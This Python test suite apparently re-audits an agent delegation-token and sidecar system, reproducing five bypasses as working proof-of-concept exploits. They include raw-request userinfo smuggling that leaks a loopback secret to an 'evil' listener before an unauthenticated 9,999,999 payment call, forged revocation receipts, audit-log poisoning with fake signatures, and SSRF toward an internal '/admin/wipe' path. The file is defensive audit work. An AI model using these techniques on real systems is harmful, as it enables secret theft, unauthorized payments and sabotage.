"""Round-2 Independent Re-Audit & Second-Order Red-Team Verification Suite (`lineage/`).

Authored by: qa-inspector (read-only audit of business code; standalone suite in `lineage/reviews/`).
Verifies:
1. All Round-1 fixes that hold cleanly under re-test (Risk hint monotonicity, Host header validation,
   inbound recipient/direct-child checks, atomic full-chain block quotas without partial mutation,
   NaN/Infinity rejection, MultiParent DFS cycle detection, expired-vs-tampered branch separation).
2. Empirical reproduction of 5 NEW Second-Order Bypass Vulnerabilities uncovered in Round-2:
   - `[CRITICAL-R2-01]`: Request-target `@host:port` userinfo smuggling -> DPoP `htu` bypass + SSRF +
     `X-LCT-Loopback-Auth` & `app_port` exfiltration -> full unauthenticated Sidecar bypass!
   - `[HIGH-R2-01]`: Unilateral offline `AttenuationBlock` minting lets any low-privilege same-domain
     leaf agent globally & permanently quarantine arbitrary peer agents/tools on `RevocationService`
     and `AgentDirectoryService`.
   - `[HIGH-R2-02]`: Cross-domain `domain_authority` preemptive revocation & `_task_domains` ownership
     hijack (plus cross-domain `task_id` prefix collision in `LineagePrefixTrie`).
   - `[HIGH-R2-03]`: (A) `FailoverReceipt` accepts caller's own `parent_svid` as `revocation_service_svid`
     (forging `VERIFIED_FAILOVER_GRAFT` without contacting `RevocationService`); (B) Default
     `AuditCollectorService()` (`trust_resolver=None`) accepts unsigned `domain_authority` & self-signed
     `workload` entries, poisoning victim tasks.
   - `[MEDIUM-R2-01]`: (A) Unvalidated `issuer_return_endpoint` query smuggling triggers SSRF during
     skip-level `/healthz` probing; (B) Empty `_resolve_trusted_skipped_endpoints` fails open without probing.
"""

from __future__ import annotations

import base64
import json
import socket
import threading
import time
import unittest

import httpx

from lineage.audit import (
    AuditCollectorService,
    AuditEventType,
    AuditStreamEmitter,
    CausalChainAuditor,
)
from lineage.common.crypto import KeyPair, b64url_encode, canonical_json_bytes, jws_sign_compact
from lineage.common.http_utils import HTTPRequestContext, ManagedHTTPService
from lineage.identity import TrustBundleResolver, TrustDomainCA
from lineage.protocol import (
    AttenuationBlock,
    LineageToken,
    MultiParentToken,
    PermissionLattice,
    create_dpop_proof,
    mint_root_token,
)
from lineage.registry import AgentCard, AgentCardError, AgentDirectoryClient, AgentDirectoryService
from lineage.resilience import FailoverReceipt, FailureEvidence, FaultType, SkipLevelReceipt
from lineage.revocation import (
    RevocationEvent,
    RevocationKind,
    RevocationReplicaClient,
    RevocationService,
)
from lineage.sidecar import AgentSidecarNode, MCPToolSidecarNode
from lineage.verifier import LeafVerifier, VerificationMode


class Milestone1Round2ReAuditTests(unittest.TestCase):
    """Round-2 Verification of Round-1 Fixes + Empirical Proof of Second-Order Bypasses."""

    def test_00_verified_round1_fixes_and_second_order_safe_invariants(self) -> None:
        """[VERIFIED CLEAN] Confirm Round-1 fixes that hold against second-order edge cases."""
        ca = TrustDomainCA("org-alpha.io")
        resolver = TrustBundleResolver()
        resolver.register_domain_ca(ca)

        w_drv = ca.issue_workload("/ns/e/sa/drv")
        w_a = ca.issue_workload("/ns/c/sa/a")
        w_b1 = ca.issue_workload("/ns/c/sa/b1")
        w_b2 = ca.issue_workload("/ns/c/sa/b2")
        w_c = ca.issue_workload("/ns/c/sa/c")
        w_tool = ca.issue_workload("/ns/t/sa/tool")

        lv = LeafVerifier(
            w_tool.spiffe_id,
            resolver,
            self_jkt=w_tool.jkt,
            mode=VerificationMode.LOCAL_FULL_CHAIN,
            clock_skew_seconds=0.0,
        )
        htu = "http://127.0.0.1:19901/mcp"

        # 1. Check HIGH-02 second-order edge case: NO partial mutation on `B_0` when Branch 1's leaf
        #    quota is exhausted (`max_calls=1`) while `B_0` (`max_calls=2`) and Branch 2 (`max_calls=2`) remain!
        p_root = PermissionLattice.create(tools=["pay"], max_calls=2)
        p_b1 = PermissionLattice.create(tools=["pay"], max_calls=1)
        p_b2 = PermissionLattice.create(tools=["pay"], max_calls=2)
        t0 = mint_root_token(ca, "task-partial-q", "user:alice", w_drv.jkt, w_a.spiffe_id, w_a.jkt, p_root, hop_segment="A")
        ch1 = t0.attenuate(w_a, w_b1.spiffe_id, w_b1.jkt, p_b1, hop_segment="B1").attenuate(
            w_b1, w_c.spiffe_id, w_c.jkt, p_b1, hop_segment="C"
        )
        ch2 = t0.attenuate(w_a, w_b2.spiffe_id, w_b2.jkt, p_b2, hop_segment="B2").attenuate(
            w_b2, w_c.spiffe_id, w_c.jkt, p_b2, hop_segment="C"
        )
        mpt = MultiParentToken.assemble_and_sign(w_c, [ch1, ch2]).encode_compact()

        # Call 1 consumes B_0 (1/2) + ch1 (1/1) -> ALLOW
        r1 = lv.verify_request(mpt, create_dpop_proof(w_c, "POST", htu, mpt), "POST", htu, tool="pay")
        self.assertTrue(r1.allowed)
        # Call 2: ch1 fails at leaf (1/1); if B_0 had been partially mutated during ch1 check, B_0 would be 2/2 and block ch2!
        r2 = lv.verify_request(mpt, create_dpop_proof(w_c, "POST", htu, mpt), "POST", htu, tool="pay")
        self.assertTrue(r2.allowed, "Partial quota mutation bug would have blocked Branch 2!")
        # Call 3: B_0 is now genuinely 2/2 -> QUOTA_EXCEEDED!
        r3 = lv.verify_request(mpt, create_dpop_proof(w_c, "POST", htu, mpt), "POST", htu, tool="pay")
        self.assertFalse(r3.allowed)
        self.assertEqual(r3.reason_code, "QUOTA_EXCEEDED")

        # 2. Check MEDIUM-01 second-order edge case: A branch that is BOTH expired AND has a tampered
        #    signature MUST fail the whole MultiParentToken with 403 INVALID_CHAIN_IN_MULTIPARENT
        #    (must NOT be treated as benignly expired!).
        now = time.time()
        t0_tamper = mint_root_token(
            ca, "task-exp-tamper", "user:alice", w_drv.jkt, w_a.spiffe_id, w_a.jkt, p_root, hop_segment="A", now=now
        )
        ch_short = t0_tamper.attenuate(
            w_a, w_c.spiffe_id, w_c.jkt, p_b1, hop_segment="C1", ttl_seconds=1.0, now=now
        )
        ch_long = t0_tamper.attenuate(
            w_a, w_c.spiffe_id, w_c.jkt, p_b2, hop_segment="C2", ttl_seconds=600.0, now=now
        )
        # Tamper signature of the short-lived branch!
        bad_hop_dict = ch_short.hops[0].to_dict()
        sig_parts = bad_hop_dict["jws_signature"].split(".")
        flipped = ("A" if sig_parts[2][0] != "A" else "B") + sig_parts[2][1:]
        bad_hop_dict["jws_signature"] = f"{sig_parts[0]}.{sig_parts[1]}.{flipped}"
        tampered_short = LineageToken(root=ch_short.root, hops=(AttenuationBlock.from_dict(bad_hop_dict),))
        mpt_tampered = MultiParentToken.assemble_and_sign(w_c, [tampered_short, ch_long], now=now).encode_compact()

        res_tampered_exp = lv.verify_request(
            mpt_tampered,
            create_dpop_proof(w_c, "POST", htu, mpt_tampered, now=now + 10.0),
            "POST",
            htu,
            tool="pay",
            now=now + 10.0,
        )
        self.assertFalse(res_tampered_exp.allowed)
        self.assertEqual(res_tampered_exp.reason_code, "INVALID_CHAIN_IN_MULTIPARENT")

    def test_r2_01_at_prefix_raw_path_userinfo_smuggling_exfiltrates_loopback_secret_and_bypasses_sidecar(self) -> None:
        """[CRITICAL-R2-01] `POST @127.0.0.1:<evil>/mcp` smuggles RFC 3986 userinfo, leaking `X-LCT-Loopback-Auth` & `app_port`."""
        ca = TrustDomainCA("org-alpha.io")
        resolver = TrustBundleResolver()
        resolver.register_domain_ca(ca)

        w_drv = ca.issue_workload("/ns/entry/sa/drv")
        w_low = ca.issue_workload("/ns/work/sa/weather-only-agent")
        w_tool = ca.issue_workload("/ns/tool/sa/high-value-vault")

        executed_payments: list[float] = []
        vault_node = MCPToolSidecarNode(
            identity=w_tool,
            trust_resolver=resolver,
            tools={
                "get_weather": lambda args, _: {"temp": 70},
                "execute_payment": lambda args, _: executed_payments.append(float(args["amount"])) or {"paid": args["amount"]},
            },
            mode=VerificationMode.LOCAL_FULL_CHAIN,
        )
        vault_node.start()

        # Start attacker's listener to capture exfiltrated headers & userinfo from Sidecar's upstream forwarder!
        stolen_secrets: list[dict] = []

        def _evil_capture(req: HTTPRequestContext):
            auth_basic = req.header("Authorization", "")
            decoded_userinfo = ""
            if auth_basic and auth_basic.startswith("Basic "):
                decoded_userinfo = base64.b64decode(auth_basic[6:]).decode("utf-8")
            stolen_secrets.append(
                {
                    "loopback_secret": req.header("X-LCT-Loopback-Auth"),
                    "basic_userinfo": decoded_userinfo,
                }
            )
            return 200, {"jsonrpc": "2.0", "id": 1, "result": {"trapped": True}}, {}

        evil_srv = ManagedHTTPService("evil-listener", _evil_capture)
        evil_srv.start()
        try:
            # `w_low` ONLY has permission for `get_weather` with `max_amount=0.0`!
            low_perms = PermissionLattice.create(tools=["get_weather"], max_amount=0.0, max_calls=1)
            tok_low = mint_root_token(
                ca, "task-ssrf", "user:alice", w_drv.jkt, w_low.spiffe_id, w_low.jkt, low_perms, hop_segment="Low"
            ).encode_compact()

            # Craft `POST @127.0.0.1:<evil_port>/mcp HTTP/1.1` with valid `Host: 127.0.0.1:<vault_inbound_port>`!
            # `normalize_htu(req.authoritative_url)` evaluates to `http://127.0.0.1:<evil_port>/mcp`!
            smuggled_htu = f"http://127.0.0.1:{evil_srv.port}/mcp"
            dpop = create_dpop_proof(w_low, "POST", smuggled_htu, tok_low)
            body_bytes = json.dumps(
                {"jsonrpc": "2.0", "id": 1, "method": "tools/call", "params": {"name": "get_weather", "arguments": {}}}
            ).encode("utf-8")

            vault_port = vault_node.sidecar._inbound_http.port
            raw_http_req = (
                f"POST @127.0.0.1:{evil_srv.port}/mcp HTTP/1.1\r\n"
                f"Host: 127.0.0.1:{vault_port}\r\n"
                f"Authorization: DPoP {tok_low}\r\n"
                f"DPoP: {dpop}\r\n"
                f"Content-Type: application/json\r\n"
                f"Content-Length: {len(body_bytes)}\r\n"
                f"Connection: close\r\n\r\n"
            ).encode("ascii") + body_bytes

            with socket.create_connection(("127.0.0.1", vault_port), timeout=5.0) as sock:
                sock.sendall(raw_http_req)
                raw_resp = sock.recv(4096).decode("utf-8", errors="replace")

            self.assertIn("200", raw_resp.splitlines()[0])
            self.assertEqual(len(stolen_secrets), 1, "Expected SSRF to hit attacker listener")
            exfil_secret = stolen_secrets[0]["loopback_secret"]
            exfil_app_host_port = stolen_secrets[0]["basic_userinfo"]  # e.g. `127.0.0.1:<app_port>`
            self.assertTrue(exfil_secret and len(exfil_secret) > 20)
            self.assertTrue(exfil_app_host_port.startswith("127.0.0.1:"))

            # Now attacker connects DIRECTLY to `http://<exfil_app_host_port>/mcp` using the stolen
            # `X-LCT-Loopback-Auth` secret — NO token, NO DPoP, NO quota, NO audit — and steals $9,999,999!
            direct_exploit_resp = httpx.post(
                f"http://{exfil_app_host_port}/mcp",
                headers={"X-LCT-Loopback-Auth": exfil_secret},
                json={
                    "jsonrpc": "2.0",
                    "id": 666,
                    "method": "tools/call",
                    "params": {"name": "execute_payment", "arguments": {"amount": 9_999_999.0}},
                },
                timeout=3.0,
            )
            self.assertEqual(direct_exploit_resp.status_code, 200)
            self.assertEqual(executed_payments, [9_999_999.0])
        finally:
            evil_srv.stop()
            vault_node.stop()

    def test_r2_02_same_domain_unilateral_offline_attenuation_global_quarantine_dos(self) -> None:
        """[HIGH-R2-01] Low-privilege hop-1 leaf unilaterally mints dummy child block to globally quarantine peers/tools."""
        ca_alpha = TrustDomainCA("org-alpha.io")
        resolver = TrustBundleResolver()
        resolver.register_domain_ca(ca_alpha)

        w_drv = ca_alpha.issue_workload("/ns/entry/sa/drv")
        w_coord = ca_alpha.issue_workload("/ns/coord/sa/coord-a")
        w_low_leaf = ca_alpha.issue_workload("/ns/sandbox/sa/low-weather-leaf")
        w_critical_pay_agent = ca_alpha.issue_workload("/ns/prod/sa/critical-payment-specialist")
        w_rev = ca_alpha.issue_workload("/ns/sys/sa/rev")

        rev_svc = RevocationService(w_rev, resolver)
        dir_svc = AgentDirectoryService(resolver)
        rev_url = rev_svc.start()
        dir_url = dir_svc.start()
        try:
            dir_client = AgentDirectoryClient(dir_url, resolver)
            rev_client = RevocationReplicaClient(rev_url, resolver)

            pay_card = AgentCard.sign_and_create(
                w_critical_pay_agent, "Critical Payment Specialist", "http://127.0.0.1:19601", ["payment.exec"]
            )
            dir_client.register(pay_card)

            # `w_low_leaf` only holds a harmless `get_weather` token at hop 1 (`Root -> CoordA -> LowLeaf`)
            p_weather = PermissionLattice.create(tools=["get_weather"], max_amount=0.0)
            t_low = mint_root_token(
                ca_alpha, "task-harmless", "user:bob", w_drv.jkt, w_coord.spiffe_id, w_coord.jkt, p_weather, hop_segment="A"
            ).attenuate(w_coord, w_low_leaf.spiffe_id, w_low_leaf.jkt, p_weather, hop_segment="LowLeaf")

            # `w_low_leaf` unilaterally mints an offline AttenuationBlock naming `w_critical_pay_agent` as delegate
            # WITHOUT ever sending it to `w_critical_pay_agent`!
            unilateral_dummy_tok = t_low.attenuate(
                issuer_identity=w_low_leaf,
                delegate_spiffe_id=w_critical_pay_agent.spiffe_id,
                delegate_jkt=w_critical_pay_agent.jkt,
                permissions=p_weather,
                hop_segment="FakeVictim",
            ).encode_compact()

            # `w_low_leaf` globally & permanently bricks `w_critical_pay_agent` across ALL tasks!
            rev_client.quarantine_workload(
                w_low_leaf,
                w_critical_pay_agent.spiffe_id,
                reason="fabricated_byzantine",
                authority_token=unilateral_dummy_tok,
            )
            dir_client.quarantine(
                w_low_leaf,
                w_critical_pay_agent.spiffe_id,
                reason="fabricated_byzantine",
                authority_token=unilateral_dummy_tok,
            )

            self.assertIsNotNone(rev_svc.trie.check_workloads([w_critical_pay_agent.spiffe_id]))
            self.assertEqual(dir_client.discover(skill="payment.exec"), [])
        finally:
            rev_svc.stop()
            dir_svc.stop()

    def test_r2_03_cross_domain_ca_preemptive_task_sabotage_and_ownership_hijack(self) -> None:
        """[HIGH-R2-02] Partner `ca_beta` preemptively revokes `org-alpha.io`'s active task & hijacks `_task_domains`."""
        ca_alpha = TrustDomainCA("org-alpha.io")
        ca_beta = TrustDomainCA("org-beta.io")
        resolver = TrustBundleResolver()
        resolver.register_domain_ca(ca_alpha)
        resolver.register_domain_ca(ca_beta)

        w_drv_alpha = ca_alpha.issue_workload("/ns/e/sa/drv")
        w_c_alpha = ca_alpha.issue_workload("/ns/c/sa/c")
        w_tool = ca_alpha.issue_workload("/ns/t/sa/tool")
        w_rev = ca_alpha.issue_workload("/ns/sys/sa/rev")

        rev_svc = RevocationService(w_rev, resolver)
        rev_url = rev_svc.start()
        try:
            rev_client = RevocationReplicaClient(rev_url, resolver)
            lv = LeafVerifier(
                w_tool.spiffe_id,
                resolver,
                self_jkt=w_tool.jkt,
                mode=VerificationMode.ADAPTIVE_RISK_ANCHORED,
                revocation_replica=rev_client,
            )

            # Alice starts active task `task-alpha-live-01` in `org-alpha.io`
            tok_alpha = mint_root_token(
                ca_alpha,
                "task-alpha-live-01",
                "user:alice@org-alpha.io",
                w_drv_alpha.jkt,
                w_c_alpha.spiffe_id,
                w_c_alpha.jkt,
                PermissionLattice.create(tools=["execute_payment"], max_amount=500.0),
                hop_segment="C",
            ).encode_compact()

            # Foreign partner `ca_beta` (`org-beta.io`) preemptively revokes `/task-alpha-live-01`!
            rev_client.revoke_prefix(ca_beta, "/task-alpha-live-01", reason="cross_domain_hijack")

            # 1. `org-alpha.io`'s live task is now DEAD (403 LINEAGE_REVOKED)!
            htu = "http://127.0.0.1:19905/mcp"
            res = lv.verify_request(
                tok_alpha,
                create_dpop_proof(w_c_alpha, "POST", htu, tok_alpha),
                "POST",
                htu,
                tool="execute_payment",
                arguments={"amount": 100.0},
            )
            self.assertFalse(res.allowed)
            self.assertEqual(res.reason_code, "LINEAGE_REVOKED")

            # 2. Legitimate owner `ca_alpha` is LOCKED OUT of its own task (`403 Cross-domain CA`)!
            from lineage.revocation import RevocationError

            with self.assertRaises(RevocationError):
                rev_client.revoke_prefix(ca_alpha, "/task-alpha-live-01/C", reason="legit_owner_action")

            # 3. Workload-mode cross-domain `task_id` collision: `ca_beta` mints its own `org-beta.io`
            #    RootBlock reusing `task_id="task-alpha-live-02"` (`sub="user:mallory@org-beta.io"`),
            #    and `w_beta` revokes `/task-alpha-live-02` — colliding in unscoped `LineagePrefixTrie`
            #    and killing `org-alpha.io`'s `"task-alpha-live-02"`!
            w_beta = ca_beta.issue_workload("/ns/b/sa/worker")
            tok_alpha_2 = mint_root_token(
                ca_alpha,
                "task-alpha-live-02",
                "user:alice@org-alpha.io",
                w_drv_alpha.jkt,
                w_c_alpha.spiffe_id,
                w_c_alpha.jkt,
                PermissionLattice.create(tools=["execute_payment"], max_amount=500.0),
                hop_segment="C",
            ).encode_compact()
            tok_beta_collide = mint_root_token(
                ca_beta,
                "task-alpha-live-02",
                "user:mallory@org-beta.io",
                w_beta.jkt,
                w_beta.spiffe_id,
                w_beta.jkt,
                PermissionLattice.create(tools=["get_weather"]),
                hop_segment="B",
            ).encode_compact()
            rev_client.revoke_prefix(
                w_beta, "/task-alpha-live-02", reason="collide", authority_token=tok_beta_collide
            )
            res_collided = lv.verify_request(
                tok_alpha_2,
                create_dpop_proof(w_c_alpha, "POST", htu, tok_alpha_2),
                "POST",
                htu,
                tool="execute_payment",
                arguments={"amount": 100.0},
            )
            self.assertFalse(res_collided.allowed)
            self.assertEqual(res_collided.reason_code, "LINEAGE_REVOKED")
        finally:
            rev_svc.stop()

    def test_r2_04_self_signed_revocation_svid_in_failover_receipt_and_default_collector_poisoning(self) -> None:
        """[HIGH-R2-03] (A) `FailoverReceipt` accepts `parent_svid` as `revocation_service_svid`; (B) Default `AuditCollectorService()` allows unsigned domain poisoning."""
        ca_alpha = TrustDomainCA("org-alpha.io")
        resolver = TrustBundleResolver()
        resolver.register_domain_ca(ca_alpha)

        w_drv = ca_alpha.issue_workload("/ns/e/sa/drv")
        w_a = ca_alpha.issue_workload("/ns/c/sa/coord-a")
        w_b1 = ca_alpha.issue_workload("/ns/w/sa/b1")
        w_b2 = ca_alpha.issue_workload("/ns/w/sa/b2")

        p = PermissionLattice.create(tools=["pay"])
        now = time.time()
        t0 = mint_root_token(ca_alpha, "task-fake-revsvc", "user:alice", w_drv.jkt, w_a.spiffe_id, w_a.jkt, p, hop_segment="A", now=now)

        # --- Subtest A: Compromised Coordinator A self-signs a fake `RevocationEvent` using A's OWN keypair
        #     and passes `A.workload_svid` as `revocation_service_svid` WITHOUT contacting RevocationService! ---
        fake_rev_provisional = RevocationEvent(
            version=1,
            kind=RevocationKind.SUBTREE,
            target="/task-fake-revsvc/A/B1",
            reason="fake_local_prune",
            requested_by=w_a.spiffe_id,
            timestamp=now + 0.1,
            service_signature="",
            service_svid=w_a.workload_svid,
        )
        self_signed_rev_sig = jws_sign_compact(
            fake_rev_provisional.core_claims(),
            w_a.keypair,  # Signed by Coord A, NOT RevocationService!
            typ="lct-revocation-event+jwt",
        )
        fake_rev_ev = RevocationEvent(
            **{**fake_rev_provisional.__dict__, "service_signature": self_signed_rev_sig}
        )
        forged_fr = FailoverReceipt.create_and_sign(
            parent_identity=w_a,
            task_id="task-fake-revsvc",
            pruned_lineage_path="/task-fake-revsvc/A/B1",
            revocation_version=1,
            revocation_event_sig=self_signed_rev_sig,
            failed_delegate_spiffe_id=w_b1.spiffe_id,
            substitute_delegate_spiffe_id=w_b2.spiffe_id,
            new_lineage_path="/task-fake-revsvc/A/B2-e1",
            old_epoch=0,
            new_epoch=1,
            failure_evidence=FailureEvidence(w_b1.spiffe_id, "http://127.0.0.1:9", FaultType.CRASH, "fake", 1, now),
            revocation_event=fake_rev_ev.to_dict(),
            revocation_service_svid=w_a.workload_svid,
            now=now + 0.2,
        )

        em_root = AuditStreamEmitter(ca_alpha)
        em_a = AuditStreamEmitter(w_a)
        em_root.emit(
            AuditEventType.ROOT_MINT,
            "task-fake-revsvc",
            "user:alice",
            t0.lineage_path,
            0,
            0,
            t0.root_block_hash,
            t0.leaf_block_hash,
            "ALLOW",
            timestamp=now,
        )
        em_a.emit(
            AuditEventType.REVOCATION_ISSUED,
            "task-fake-revsvc",
            "user:alice",
            "/task-fake-revsvc/A/B1",
            1,
            0,
            t0.root_block_hash,
            t0.leaf_block_hash,
            "REVOKED",
            action_detail={"target": "/task-fake-revsvc/A/B1"},
            timestamp=now + 0.1,
        )
        em_a.emit(
            AuditEventType.FAILOVER_PRUNE_GRAFT,
            "task-fake-revsvc",
            "user:alice",
            "/task-fake-revsvc/A/B2-e1",
            1,
            1,
            t0.root_block_hash,
            "graft-hash",
            "RECOVERED",
            parent_block_hash=t0.leaf_block_hash,
            receipt_payload=forged_fr.to_dict(),
            timestamp=now + 0.2,
        )

        auditor = CausalChainAuditor(resolver)
        rep = auditor.audit(em_root.local_entries() + em_a.local_entries())
        self.assertTrue(rep.clean)
        self.assertIn(
            "VERIFIED_FAILOVER_GRAFT",
            rep.tasks["task-fake-revsvc"].resilience_classifications,
            "Expected reproduction: Auditor accepted self-signed RevocationEvent from parent_svid",
        )

        # --- Subtest B: Default `AuditCollectorService()` (`trust_resolver=None`, used in multiprocess tests)
        #     accepts completely UNSIGNED `domain_authority` entries and self-signed `workload` SVIDs! ---
        default_collector = AuditCollectorService()  # `trust_resolver=None` default!
        col_url = default_collector.start()
        try:
            default_collector.append_direct(em_root.local_entries()[0])

            # Craft an entry with `auth_mode="domain_authority"` and fake signature bytes `.aa` (no private key!)
            evil_entry = em_root.local_entries()[0].to_dict()
            evil_entry["stream_id"] = "unauth-forger"
            evil_entry["stream_seq"] = 0
            evil_entry["prev_entry_hash"] = "GENESIS"
            evil_entry["sub"] = "user:mallory"
            from lineage.audit import AuditEntry

            prov_entry = AuditEntry.from_dict({**evil_entry, "entry_hash": "", "node_signature": ""})
            recomputed_h = prov_entry.compute_expected_hash()
            fake_hdr = b64url_encode(canonical_json_bytes({"alg": "ES256", "typ": "lct-audit-sig+jwt"}))
            fake_pay = b64url_encode(
                canonical_json_bytes({"stream_id": "unauth-forger", "stream_seq": 0, "entry_hash": recomputed_h})
            )
            fake_jws = f"{fake_hdr}.{fake_pay}.{b64url_encode(b'0' * 64)}"
            evil_entry["entry_hash"] = recomputed_h
            evil_entry["node_signature"] = fake_jws

            r_poison = httpx.post(f"{col_url}/v1/audit/append", json={"entry": evil_entry}, timeout=3.0)
            self.assertEqual(
                r_poison.status_code,
                200,
                "Expected reproduction: Default AuditCollectorService() accepted unsigned domain_authority entry",
            )
            rep_poisoned = auditor.audit(default_collector.get_all_entries())
            self.assertFalse(rep_poisoned.tasks["task-fake-revsvc"].reconstructed_complete)
        finally:
            default_collector.stop()

    def test_r2_05_skip_level_unvalidated_endpoint_ssrf_and_empty_url_fail_open(self) -> None:
        """[MEDIUM-R2-01] (A) Query smuggling in `issuer_return_endpoint` triggers SSRF; (B) Empty probe URL list fails open."""
        ca = TrustDomainCA("org-alpha.io")
        resolver = TrustBundleResolver()
        resolver.register_domain_ca(ca)

        w_drv = ca.issue_workload("/ns/e/sa/drv")
        w_a = ca.issue_workload("/ns/c/sa/a")
        w_b1 = ca.issue_workload("/ns/m/sa/b1")
        w_c = ca.issue_workload("/ns/l/sa/c")

        ssrf_hits: list[str] = []
        internal_srv = ManagedHTTPService(
            "internal-admin-svc",
            lambda req: (ssrf_hits.append(req.raw_path) or 500, {"err": "triggered"}, {}),
        )
        internal_srv.start()

        # Notice `a_node` has `directory_url=None` (standalone agent sidecar)
        a_node = AgentSidecarNode(w_a, resolver, "A", ["coord"], lambda *_: (200, {}))
        b1_node = AgentSidecarNode(w_b1, resolver, "B1", ["mid"], lambda *_: (200, {}))
        a_card = a_node.start(register_in_directory=False)
        b1_node.start(register_in_directory=False)
        try:
            p = PermissionLattice.create(tools=["calc"])
            t0 = mint_root_token(
                ca,
                "task-ssrf-skip",
                "user:alice",
                w_drv.jkt,
                w_a.spiffe_id,
                w_a.jkt,
                p,
                hop_segment="A",
                first_hop_public_jwk=w_a.public_jwk(),
                first_hop_return_endpoint=a_card.return_endpoint,
            )

            # --- Subtest A: `issuer_return_endpoint` with `/admin/wipe?swallow=` triggers SSRF GET on internal_srv ---
            t_b1 = t0.attenuate(w_a, w_b1.spiffe_id, w_b1.jkt, p, hop_segment="B1")
            t_c_ssrf = t_b1.attenuate(
                w_b1,
                w_c.spiffe_id,
                w_c.jkt,
                p,
                hop_segment="C",
                issuer_return_endpoint=f"http://127.0.0.1:{internal_srv.port}/admin/wipe?swallow=",
            )
            sr_ssrf = SkipLevelReceipt.create_and_sign(
                w_c,
                t_c_ssrf,
                [w_b1.spiffe_id],
                w_a.spiffe_id,
                FailureEvidence(w_b1.spiffe_id, "http://127.0.0.1:9", FaultType.CRASH, "down", 1, time.time()),
                {"ans": 1},
            )
            skip_url = f"{a_node.endpoint}/v1/skip-level-return"
            compact_ssrf = t_c_ssrf.encode_compact()
            r1 = httpx.post(
                skip_url,
                json={"skip_level_receipt": sr_ssrf.to_dict()},
                headers={"DPoP": create_dpop_proof(w_c, "POST", skip_url, compact_ssrf)},
                timeout=5.0,
            )
            self.assertEqual(r1.status_code, 200)
            self.assertEqual(ssrf_hits, ["/admin/wipe?swallow=/healthz"])

            # --- Subtest B: When `issuer_return_endpoint=None` and `directory_client=None`,
            #     `trusted_urls` is `[]`, so liveness check silently skips probing healthy B1 (Fail-Open)! ---
            t_c_no_url = t_b1.attenuate(
                w_b1, w_c.spiffe_id, w_c.jkt, p, hop_segment="C2", issuer_return_endpoint=None
            )
            sr_fail_open = SkipLevelReceipt.create_and_sign(
                w_c,
                t_c_no_url,
                [w_b1.spiffe_id],
                w_a.spiffe_id,
                FailureEvidence(w_b1.spiffe_id, b1_node.endpoint, FaultType.CRASH, "lie", 1, time.time()),
                {"bypassed_alive_b1": True},
            )
            compact_no_url = t_c_no_url.encode_compact()
            r2 = httpx.post(
                skip_url,
                json={"skip_level_receipt": sr_fail_open.to_dict()},
                headers={"DPoP": create_dpop_proof(w_c, "POST", skip_url, compact_no_url)},
                timeout=5.0,
            )
            self.assertEqual(
                r2.status_code,
                200,
                "Expected reproduction: Empty trusted_urls silently skipped liveness probe (Fail-Open)",
            )
        finally:
            internal_srv.stop()
            a_node.stop()
            b1_node.stop()


if __name__ == "__main__":
    unittest.main()
